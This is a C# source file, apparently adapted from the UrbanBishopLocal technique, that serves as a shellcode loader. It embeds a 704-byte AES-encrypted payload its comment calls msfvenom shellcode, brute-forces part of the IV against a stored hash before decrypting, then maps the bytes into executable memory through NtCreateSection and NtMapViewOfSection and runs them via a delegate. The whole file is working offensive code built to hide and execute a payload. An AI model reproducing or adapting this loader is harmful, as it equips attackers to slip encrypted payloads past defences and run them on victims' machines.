// forked from UrbanBishopLocal 
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] iv = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
            byte[] key = { 0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6, 0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C };
            byte[] OG_hash = {
               0xB2, 0x5A, 0x77, 0x62, 0xD3, 0xED, 0x18, 0xF9, 0xA4, 0x9E, 0x11, 0x9D, 0xCA, 0x95, 0x66, 0x11, 0x64, 0xA1, 0xF2, 0x4F, 0x78, 0x62, 0x96, 0xBB, 0x97, 0x60, 0x6A, 0x9C, 0x2B, 0xCA, 0x7B, 0x48
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, 698) != null) // OG len and encrypted len are different
                    {
                        Console.WriteLine("[*] Decryption Succeeded");
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, 698);
                        // Create local section, map two views RW + RX, copy shellcode to RW
                        Console.WriteLine("\n[>] Creating local section..");
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }

                        Console.WriteLine("\n[>] Triggering shellcode using delegate!");
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                    else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            // aes-encrypted msfvenom shellcode
            byte[] buf = new byte[704] {
                0x03, 0x5B, 0x0E, 0x36, 0xEB, 0x57, 0xF7, 0x90, 0x0C, 0x85, 0x05, 0x6D, 0x95, 0x14, 0xB8, 0xA2,
                0x36, 0x09, 0x61, 0x68, 0xA0, 0xD4, 0x26, 0x9A, 0x70, 0x3E, 0xFF, 0x8E, 0x74, 0x2E, 0x50, 0xCC,
                0xAC, 0xD4, 0x47, 0x2C, 0x9D, 0x72, 0x02, 0x38, 0x7B, 0x60, 0xDF, 0x3F, 0xF8, 0x36, 0x0B, 0x0E,
                0xD2, 0x60, 0xC6, 0xB6, 0xA1, 0x7B, 0xC5, 0x6F, 0x0F, 0x3B, 0xCA, 0x8D, 0x2B, 0xDA, 0xBD, 0x19,
                0xF1, 0xFC, 0x8E, 0x38, 0xE5, 0xEA, 0x70, 0xD4, 0xBE, 0xE8, 0x82, 0x21, 0xFE, 0x14, 0x1C, 0x17,
                0xDF, 0x17, 0xA9, 0x55, 0xD1, 0x18, 0x5D, 0x44, 0x60, 0xC8, 0x66, 0xB3, 0x2A, 0x0C, 0x92, 0xDB,
                0x35, 0xF7, 0x31, 0x57, 0x1B, 0xD6, 0x83, 0x28, 0x83, 0xFA, 0xB8, 0xC9, 0x40, 0x6E, 0x52, 0x4D,
                0xE7, 0xDF, 0x19, 0x4B, 0x98, 0x85, 0x45, 0x44, 0x77, 0x6D, 0xCD, 0xE2, 0xAD, 0x84, 0x6D, 0x57,
                0x5F, 0xA8, 0x3B, 0x52, 0x4F, 0xDE, 0x77, 0x18, 0xEC, 0x82, 0x54, 0x0A, 0x58, 0x9F, 0x77, 0x25,
                0xFC, 0x1E, 0xBC, 0xA3, 0xA5, 0x72, 0x73, 0x4E, 0x47, 0x9E, 0xF4, 0xEA, 0x20, 0xA8, 0x9F, 0x98,
                0x48, 0x21, 0xEE, 0x72, 0xFA, 0x00, 0xEA, 0xDB, 0x5B, 0x2F, 0x6E, 0x97, 0x6F, 0x6B, 0x5A, 0x38,
                0x4B, 0xC7, 0x19, 0x4C, 0xD3, 0x73, 0x98, 0x90, 0x63, 0x80, 0x10, 0x83, 0x91, 0x8B, 0x7B, 0xF2,
                0xF7, 0x2F, 0x26, 0x32, 0x52, 0x00, 0xB5, 0xAC, 0xA6, 0x04, 0x5D, 0x46, 0x15, 0xC7, 0xD6, 0x08,
                0x1B, 0xB3, 0x6B, 0x03, 0xBF, 0x0B, 0xCA, 0xA0, 0xCE, 0x30, 0x87, 0xF5, 0x72, 0x1F, 0xF6, 0xB3,
                0xFB, 0xEC, 0x0D, 0xEF, 0x75, 0x46, 0x0C, 0x6D, 0xE8, 0x07, 0x13, 0xFF, 0x24, 0xC4, 0x70, 0xDC,
                0x37, 0x80, 0xD9, 0xBA, 0x7F, 0x9B, 0x8C, 0x02, 0xD8, 0x17, 0x32, 0xBA, 0x91, 0xC8, 0xCF, 0x60,
                0x46, 0x3D, 0xF6, 0xD5, 0xE4, 0x81, 0xDC, 0x47, 0x62, 0x70, 0xD4, 0x88, 0xA9, 0x2B, 0x82, 0xAB,
                0xF6, 0xDE, 0xE3, 0xC9, 0x85, 0x9A, 0xD9, 0x0D, 0xD4, 0xF3, 0xD2, 0x05, 0xF0, 0xBF, 0xCF, 0x66,
                0x63, 0x05, 0x5D, 0x26, 0x98, 0x15, 0x16, 0xA7, 0x56, 0xF3, 0x80, 0x8F, 0xEB, 0x46, 0x6D, 0x30,
                0x11, 0xA0, 0x3A, 0xB7, 0xB2, 0xF4, 0xC0, 0x36, 0x01, 0xF7, 0x44, 0x87, 0x4F, 0x02, 0x42, 0x54,
                0x92, 0x34, 0x97, 0x3B, 0xBC, 0x1F, 0xE7, 0x0E, 0xF2, 0x20, 0xBB, 0xA4, 0x41, 0xEC, 0xD1, 0x54,
                0x59, 0x17, 0x2E, 0xE8, 0x40, 0x23, 0x20, 0xE8, 0xA6, 0x94, 0xE5, 0x41, 0x54, 0x0D, 0xE7, 0xE4,
                0xB4, 0xF8, 0xFC, 0x17, 0x1D, 0xD6, 0x56, 0xF8, 0xBF, 0x35, 0x9E, 0x2D, 0xE4, 0xFA, 0x55, 0x08,
                0x3C, 0xF6, 0xD2, 0xD3, 0x1C, 0x83, 0x3D, 0x7E, 0xA4, 0x9F, 0xAB, 0xC8, 0xE9, 0x95, 0xD8, 0xCE,
                0x09, 0x1E, 0x56, 0xD0, 0x97, 0xE3, 0x56, 0x0D, 0x13, 0x18, 0x9A, 0xE6, 0x45, 0x16, 0x8D, 0xCF,
                0x35, 0xC1, 0x76, 0x24, 0x59, 0xD8, 0xE0, 0x07, 0x7C, 0x95, 0x73, 0x9F, 0x1F, 0x6B, 0x22, 0xD2,
                0x79, 0xA0, 0x86, 0x16, 0x43, 0x8D, 0xB8, 0x50, 0x2B, 0x65, 0x41, 0x8F, 0x5A, 0x39, 0x3F, 0xB5,
                0xB2, 0xBC, 0x65, 0xF7, 0x24, 0xC0, 0xAC, 0xE9, 0x92, 0x73, 0x80, 0xD6, 0x99, 0xEB, 0x72, 0x10,
                0x19, 0xA4, 0x11, 0x6F, 0xB6, 0x7E, 0xBB, 0xFB, 0xA1, 0x61, 0x18, 0xAC, 0x1A, 0xA3, 0x32, 0xA9,
                0x68, 0xE6, 0x38, 0xA6, 0x02, 0xEC, 0x1F, 0xD0, 0x4A, 0x34, 0xA6, 0x8F, 0xC4, 0xA7, 0xB0, 0xF6,
                0xD9, 0x7D, 0x83, 0xAE, 0x1F, 0xBC, 0x04, 0x55, 0x6D, 0x8E, 0xA3, 0x8A, 0x12, 0xA2, 0xE4, 0xE9,
                0x81, 0x60, 0xCA, 0x52, 0x56, 0xA8, 0x6E, 0xD5, 0x72, 0x3F, 0xD9, 0x30, 0x7B, 0x33, 0x55, 0xC4,
                0xA2, 0x43, 0x08, 0xF6, 0x63, 0xD7, 0x7C, 0x51, 0x37, 0x42, 0xBA, 0xC5, 0x00, 0xE7, 0xD3, 0x14,
                0x0C, 0x04, 0x56, 0xB6, 0x06, 0x7D, 0x18, 0xD6, 0xC6, 0x69, 0xE0, 0x85, 0x48, 0x9F, 0xB1, 0xE4,
                0xCE, 0xF5, 0x07, 0x72, 0x82, 0xBC, 0x87, 0x43, 0x75, 0xD0, 0x43, 0x6E, 0x1F, 0x2B, 0xBA, 0x79,
                0xA2, 0x63, 0x33, 0x17, 0x07, 0x31, 0x72, 0x24, 0x65, 0x41, 0x2B, 0x67, 0xF7, 0xC3, 0xD3, 0xBC,
                0x79, 0x80, 0x44, 0xED, 0x09, 0x1B, 0x78, 0xF6, 0x14, 0x60, 0x0D, 0x17, 0x86, 0x02, 0x7D, 0xBE,
                0x92, 0x90, 0x67, 0x1A, 0xF6, 0x29, 0x6A, 0x49, 0x77, 0x5A, 0xB3, 0x45, 0xA7, 0x82, 0x19, 0x14,
                0x60, 0x1F, 0xC7, 0x58, 0x7A, 0xD5, 0xD9, 0xC0, 0x29, 0xC5, 0x6E, 0x01, 0xE3, 0x35, 0x7A, 0xC9,
                0x61, 0x7D, 0xB4, 0x2F, 0x4D, 0x1E, 0x3D, 0x75, 0x32, 0x18, 0x3D, 0x6E, 0x11, 0x90, 0xF7, 0x52,
                0x88, 0xF2, 0x8D, 0x74, 0x61, 0xED, 0x31, 0x3F, 0xB7, 0xF2, 0xE2, 0xBE, 0x40, 0x7A, 0xB3, 0x62,
                0xCC, 0x79, 0xE7, 0x3C, 0x60, 0xE4, 0x35, 0x4D, 0xA7, 0xC5, 0x27, 0xDD, 0x31, 0x43, 0x96, 0x32,
                0xE0, 0xCB, 0xED, 0x6E, 0xAC, 0x14, 0x51, 0x7A, 0xB3, 0xF3, 0x40, 0x4E, 0x02, 0x79, 0xB0, 0x0A,
                0xC7, 0xBE, 0x06, 0x65, 0xC1, 0xC6, 0x32, 0x17, 0xA5, 0x45, 0xCC, 0xF7, 0x7B, 0x2F, 0x60, 0x3A
            };
            Runner(buf);
        }
    }
}
